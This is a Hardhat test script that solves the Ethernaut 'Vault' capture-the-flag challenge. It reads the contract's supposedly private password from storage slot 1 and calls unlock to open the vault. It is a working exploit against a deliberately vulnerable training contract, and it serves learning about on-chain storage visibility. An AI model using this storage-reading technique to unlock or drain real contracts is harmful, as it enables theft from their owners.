const { assert } = require("chai")
const { ethers, waffle } = require("hardhat")
require("dotenv").config()

const provider = waffle.provider
let player, challenge, challengeAddress, tx, attacker

beforeEach(async () => {
    accounts = await ethers.getSigners()
    player = accounts[0]

    challengeAddress = process.env.CHALLENGEADDRESS8 //address of my instance contract
    const challengeFactory = await ethers.getContractFactory(`Vault`)
    challenge = await challengeFactory.attach(challengeAddress)
})

it("Solves the challenge 'Vault'", async () => {
    /*Password is second variable, so we have to check variable number 1.
    This is, because we start counting from zero. More about way how 
    Solidity stores variables 
    https://medium.com/coinmonks/ethernaut-vault-how-to-read-the-secret-988851a27c08*/
    let password = await provider.getStorageAt(challenge.address, 1)
    tx = await challenge.unlock(password)
    await tx.wait(1)

    let locked = await challenge.locked()
    assert(locked.toString() == "false", "You didn't open the vault!")
})
